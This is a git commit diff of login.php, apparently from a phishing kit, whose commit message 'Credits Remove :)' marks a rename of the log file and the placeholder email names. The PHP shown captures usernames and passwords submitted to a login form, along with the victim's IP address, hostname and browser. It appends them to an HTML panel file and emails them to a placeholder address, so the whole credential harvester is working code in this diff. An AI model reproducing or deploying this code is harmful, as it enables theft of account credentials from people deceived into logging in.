acd4d5749fb36a0b528adde4cde9d02f40822b49
Samet Zengin <34382149+codersamet@users.noreply.github.com>
2020-05-05 00:49:33 +0300

    Credits Remove :)

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
-file_put_contents("ritalin.html", "<br><br><b>-------NEW USER DETECTED------</b>  "."<br><b>[DATE]</b>  " . strftime('%e %B %Y %A %H:%M:%S') .'<br><b>[EMAIL]:</b>  ' . $_POST['username'] . "<br><b>[PASS]:</b>  " . $_POST['password'] . "<br><b>[IP]:</b>  " . $_SERVER['REMOTE_ADDR'] ."<br><b>[HOST]:</b>  " . gethostbyaddr($_SERVER['REMOTE_ADDR']) . "<br><b>[BROWSER]:</b>  " . $_SERVER['HTTP_USER_AGENT'] . "\n", FILE_APPEND);
+file_put_contents("panel.html", "<br><br><b>-------NEW USER DETECTED------</b>  "."<br><b>[DATE]</b>  " . strftime('%e %B %Y %A %H:%M:%S') .'<br><b>[EMAIL]:</b>  ' . $_POST['username'] . "<br><b>[PASS]:</b>  " . $_POST['password'] . "<br><b>[IP]:</b>  " . $_SERVER['REMOTE_ADDR'] ."<br><b>[HOST]:</b>  " . gethostbyaddr($_SERVER['REMOTE_ADDR']) . "<br><b>[BROWSER]:</b>  " . $_SERVER['HTTP_USER_AGENT'] . "\n", FILE_APPEND);
 
 //Mail Function
 
@@ -8,8 +8,8 @@ $subject = "New User Detected";
 $message = '<b>User:</b> '  . $_POST['username'].'<br>' .'<b>Pass:</b> ' . $_POST['password'].'<br>' .'<b>IP:</b> ' . $_SERVER['REMOTE_ADDR'].'<br>' .'<b>HOST:</b> ' . gethostbyaddr($_SERVER['REMOTE_ADDR']).'<br>' .'<b>BROWSER:</b> ' . $_SERVER['HTTP_USER_AGENT'];
 $title  = 'MIME-Version: 1.0' . "\r\n";
 $title .= 'Content-type: text/html; charset=utf-8' . "\r\n";
-$title .= 'To: RITALIN youremail@here.com>' . "\r\n";
-$title .= 'From: HAX <youremail@here.com>' . "\r\n";
+$title .= 'To: NAME youremail@here.com>' . "\r\n";
+$title .= 'From: NAME <youremail@here.com>' . "\r\n";
 mail($to,$subject,$message,$title);
 
 
